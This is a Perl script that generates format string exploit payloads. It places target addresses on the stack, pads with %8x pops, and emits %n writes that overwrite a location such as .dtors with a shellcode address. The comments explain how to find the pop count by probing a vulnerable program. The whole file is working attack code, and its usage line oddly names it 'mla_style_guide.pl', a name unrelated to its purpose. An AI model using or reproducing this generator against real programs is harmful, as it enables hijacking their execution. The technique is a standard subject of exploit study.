#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
# A simple utility for crafting format string attacks. The format string will
# write a word (typically the address of shellcode) to a given address in
# memory (typically dtors).
#
# Along with the target address, and the value to write, you must also know the
# number of pops required to place the format string at the top of the stack.
# This can be found by supplying the vulnerable program with the strings:
# "AAAA%8x", "AAAA%8x%8x", etc. Once the value "41414141" appears in the format
# string output subtract the number of "%8x" in the format string by one. This
# is the value to supply to the -pops flag.

################################################################################
# Command line arguments
################################################################################

my $write_address;
my $shell_address;
my $num_pops;

GetOptions(
    "address=s"     =>  \$write_address
,   "shell=s"       =>  \$shell_address
,   "pops=s"        =>  \$num_pops
);

die("usage: mla_style_guide.pl -a dtors_address -s shell address -p num_pops\n")
if not defined($write_address)
or not defined($shell_address)
or not defined($num_pops);

################################################################################
# Helper methods
################################################################################

sub make_hex {
    my ($address) = @_;

    $address = sprintf("%08x", $address);

    my $a = substr($address, 0, 2);
    my $b = substr($address, 2, 2);
    my $c = substr($address, 4, 2);
    my $d = substr($address, 6, 2);

    return  chr(hex($d))
    .       chr(hex($c))
    .       chr(hex($b))
    .       chr(hex($a));
}

################################################################################
# Main
################################################################################

my $format_string   =   make_hex(hex($write_address))
                    .   "AAAA"
                    .   make_hex(hex($write_address)+1)
                    .   "AAAA"
                    .   make_hex(hex($write_address)+2)
                    .   "AAAA"
                    .   make_hex(hex($write_address)+3);
my $num_printed     =   7*4;

while ($num_pops>1) {
    $format_string .= "%8x";
    $num_printed += 8;
    $num_pops--;
}

$shell_address = hex($shell_address);
for my $target  (   ($shell_address >> 0) & 0xFF
                ,   ($shell_address >> 8) & 0xFF
                ,   ($shell_address >> 16) & 0xFF
                ,   ($shell_address >> 24) & 0xFF
                ) {
    my $needed = $target - ($num_printed & 0xFF);
    while ($needed < 8) {
        $needed += 256;
    }
    $format_string .= sprintf("%%%dx%%n", $needed);
    $num_printed += $needed;
}

print $format_string;
